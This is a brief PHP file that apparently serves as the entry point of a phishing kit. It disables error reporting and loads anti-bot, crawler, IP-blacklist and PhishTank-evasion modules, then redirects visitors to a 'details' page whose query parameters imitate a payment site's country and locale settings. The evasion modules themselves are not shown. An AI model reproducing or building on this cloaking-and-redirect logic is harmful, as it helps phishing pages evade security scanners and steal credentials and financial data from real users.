<?php
session_start();
error_reporting(0);


include('../Anti/Bot-Spox.php');
include('../Anti/Bot-Crawler.php');
include('../Anti/blacklist.php');
include('../Anti/new.php');
include('../Anti/IP-BlackList.php');
include('../Anti/Dila_DZ.php');


include('../BOTS/iprange.php');
include('../BOTS/phishtank.php');
include('../BOTS/spec.php');


include('functions/get_ip.php');

header("LOCATION: details/?country.x=".$_SESSION['_LOOKUP_CNTRCODE_']."&locale.x=en_".$_SESSION['_LOOKUP_CNTRCODE_']."");
?>
